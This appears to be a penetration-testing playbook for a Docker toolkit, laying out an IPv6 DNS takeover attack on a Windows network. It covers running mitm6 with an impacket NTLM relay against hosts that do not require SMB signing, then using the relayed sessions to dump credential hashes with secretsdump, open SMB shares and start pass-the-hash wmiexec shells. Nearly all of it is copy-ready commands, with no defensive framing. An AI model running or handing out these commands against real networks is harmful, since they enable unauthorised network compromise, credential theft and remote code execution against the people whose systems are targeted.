# IPV6

## Discovery

First check if IPv6 is being used on the network:

```bash
screen -S tshark -d -m docker run -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
check_for_ipv6_traffic network_interface to listen on
```

If Ipv6 is not being actively managed by a DNS and DHCP server and IPv6 packets are flowing then we can likely
compromise this network by setting up a DNS server and DHCP server for IPv6. It is worth noting that according to [RFC3484](https://www.ietf.org/rfc/rfc3484.txt)
IPv6 will be preferred over IPv4 which means that once IPv6 is being managed, nodes on the network will send packets via IPv6 as
opposed to IPV4.

To ensure that the attack can be completed, the next step is to check if SMB signing is not required. To discover if SMB is enabled 
but not required, run:

```bash
docker run -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
check_if_smb_is_required target_ip_address_or_list_of_ips
```

## Exploitation

If SMB is not required then:

```bash
screen -S mitm6 -d -m  docker run -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_mitm6 target_domain_name local_network_interface
```

The above command runs mitm6 (Creates a DNS and DHCP server to manage IPV6) and impacket relay in two screens, you can view the running screens using:

```bash
screen -ls
```

Activate running screens with:

```bash
screen -r relay_ipv6
screen -r mitm6
```

Detach from a screen using

```bash
Ctrl + A (release before next key) + D
```

You can check if SMB sessions have been created successfully by resuming the `relay_ipv6`
screen and running the `socks` command

If SMB sessions have been created, you can perform a number of actions going forward using proxychains:

- Dumping ashes

    ```bash
    sudo proxychains impacket-secretsdump -no-pass DOMAIN/USER@X.X.X.X 
    ```
- Accessing SMB shares

    ```bash
    proxychains smbclient //10.8.0.99 -U DOMAIN/X.X.X.X     
    ```
- Passing hashes for a WMIexec session

```bash
impacket-wmiexec -hashes xxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxx user@x.x.x.x
```
